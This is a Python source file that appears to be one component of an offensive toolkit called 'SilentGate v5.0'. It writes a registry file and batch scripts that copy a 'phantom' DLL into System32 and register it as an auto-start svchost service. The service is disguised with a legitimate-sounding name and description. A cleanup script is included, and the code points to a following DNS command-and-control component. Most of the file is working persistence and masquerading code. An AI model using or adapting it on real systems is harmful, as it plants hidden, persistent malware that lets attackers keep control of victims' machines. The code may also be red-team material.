"""
SilentGate v5.0 - Component 2: Service Registrar
INPUT  : phantom_service.dll path + service config
OUTPUT : installation script (.bat) + registry setup
         Registers DLL as legitimate Windows service
         under svchost -k NetworkService group
"""

import os
import json


# Legitimate-looking service parameters
SERVICE_CONFIG = {
    "name":         "NetworkLocationHelper",
    "display":      "Network Location Helper Service",
    "description":  "Provides helper functions for network location awareness and connectivity monitoring.",
    "group":        "NetworkService",
    "svchost_key":  "netsvcs",
    "start_type":   "AUTO_START",
    "error_control":"NORMAL",
}


def generate_registry_entries(dll_path, service_name, config):
    """
    Generate .reg file for service registration.
    Mimics legitimate Windows service registry structure.
    """
    dll_abs = os.path.abspath(dll_path).replace("\\", "\\\\")

    reg = f"""Windows Registry Editor Version 5.00

; SilentGate v5.0 - Phantom Service Registration
; Service appears as legitimate NetworkService component

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\{service_name}]
"Type"=dword:00000020
"Start"=dword:00000002
"ErrorControl"=dword:00000001
"ImagePath"=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,\\
  00,74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,00,5c,\\
  00,73,00,76,00,63,00,68,00,6f,00,73,00,74,00,2e,00,65,00,78,00,65,00,20,\\
  00,2d,00,6b,00,20,00,6e,00,65,00,74,00,73,00,76,00,63,00,73,00,00,00
"DisplayName"="{config['display']}"
"Description"="{config['description']}"
"ObjectName"="NT AUTHORITY\\\\NetworkService"

[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Parameters]
"ServiceDll"="{dll_abs}"
"ServiceDllUnloadOnStop"=dword:00000001
"ServiceMain"="ServiceMain"

[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost]
"{config['svchost_key']}"=hex(7):4e,00,65,00,74,00,77,00,6f,00,72,00,6b,00,\\
  4c,00,6f,00,63,00,61,00,74,00,69,00,6f,00,6e,00,48,00,65,00,6c,00,70,00,\\
  65,00,72,00,00,00,00,00
"""
    return reg


def generate_install_script(dll_path, service_name, config):
    """
    Generate batch installation script.
    Uses only legitimate Windows tools:
      sc.exe    - service control manager
      reg.exe   - registry editor
      schtasks  - task scheduler (used in v5_persistence.py)
    """
    dll_abs = os.path.abspath(dll_path)

    bat = f"""@echo off
:: SilentGate v5.0 - Phantom Service Installer
:: Author: JarDani
:: Uses only legitimate Windows administration tools

echo [INSTALL] Registering {service_name}...

:: Copy DLL to system location
copy /Y "{dll_abs}" "%SystemRoot%\\System32\\{service_name}.dll" >nul
echo [INSTALL] DLL deployed to System32

:: Register service via sc.exe
sc create {service_name} ^
    binPath= "%SystemRoot%\\system32\\svchost.exe -k netsvcs" ^
    type= share ^
    start= auto ^
    DisplayName= "{config['display']}" >nul

echo [INSTALL] Service registered

:: Set service description
sc description {service_name} "{config['description']}" >nul

:: Set service DLL in registry
reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Parameters" ^
    /v ServiceDll /t REG_EXPAND_SZ ^
    /d "%SystemRoot%\\System32\\{service_name}.dll" /f >nul

reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Parameters" ^
    /v ServiceMain /t REG_SZ /d "ServiceMain" /f >nul

reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}\\Parameters" ^
    /v ServiceDllUnloadOnStop /t REG_DWORD /d 1 /f >nul

:: Add to netsvcs group so svchost loads it
for /f "tokens=3*" %%a in ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" /v netsvcs') do (
    reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" ^
        /v netsvcs /t REG_MULTI_SZ /d "%%a %%b {service_name}" /f >nul
)

echo [INSTALL] Registry configured
echo [INSTALL] Starting service...

sc start {service_name}

echo [INSTALL] {service_name} is running inside svchost.exe
echo [INSTALL] Complete
"""
    return bat


def generate_uninstall_script(service_name):
    """Generate cleanup script for post-engagement removal."""
    return f"""@echo off
:: SilentGate v5.0 - Cleanup Script
echo [CLEANUP] Removing {service_name}...
sc stop {service_name} >nul 2>&1
sc delete {service_name} >nul 2>&1
reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Services\\{service_name}" /f >nul 2>&1
del /f "%SystemRoot%\\System32\\{service_name}.dll" >nul 2>&1
echo [CLEANUP] Complete - no traces remain
"""


def generate(dll_path, service_name="NetworkLocationHelper",
             output_dir="output"):
    """Main entry point — generate all registration artifacts."""
    os.makedirs(output_dir, exist_ok=True)

    config  = SERVICE_CONFIG.copy()
    config["name"] = service_name

    reg_content     = generate_registry_entries(dll_path, service_name, config)
    install_bat     = generate_install_script(dll_path, service_name, config)
    uninstall_bat   = generate_uninstall_script(service_name)

    reg_path        = os.path.join(output_dir, "v5_service.reg")
    install_path    = os.path.join(output_dir, "v5_install.bat")
    uninstall_path  = os.path.join(output_dir, "v5_uninstall.bat")

    with open(reg_path,      "w") as f: f.write(reg_content)
    with open(install_path,  "w") as f: f.write(install_bat)
    with open(uninstall_path,"w") as f: f.write(uninstall_bat)

    meta = {
        "service_name":    service_name,
        "display_name":    config["display"],
        "description":     config["description"],
        "svchost_group":   "netsvcs",
        "process":         "svchost.exe -k netsvcs",
        "dll_path":        dll_path,
        "reg_path":        reg_path,
        "install_path":    install_path,
        "uninstall_path":  uninstall_path,
        "mitre":           "T1543.003 - Create Windows Service",
    }

    print(f"[V5 REG] Service name  : {service_name}")
    print(f"[V5 REG] Display name  : {config['display']}")
    print(f"[V5 REG] Process       : svchost.exe -k netsvcs")
    print(f"[V5 REG] DLL location  : %SystemRoot%\\System32\\{service_name}.dll")
    print(f"[V5 REG] Install script: {install_path}")
    print(f"[V5 REG] Registry file : {reg_path}")
    print(f"[V5 REG] Cleanup script: {uninstall_path}")
    print(f"[V5 REG] NEXT          : v5_dns_c2.py")

    return meta


if __name__ == "__main__":
    meta = generate("output/phantom_service.dll")
    print(f"\n[V5 REG] SUCCESS")
